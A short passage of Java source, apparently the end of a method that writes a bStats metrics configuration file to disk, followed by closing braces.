            Files.write(bstatsConfig.toPath(), bc.toString().getBytes());
        }
    }
}
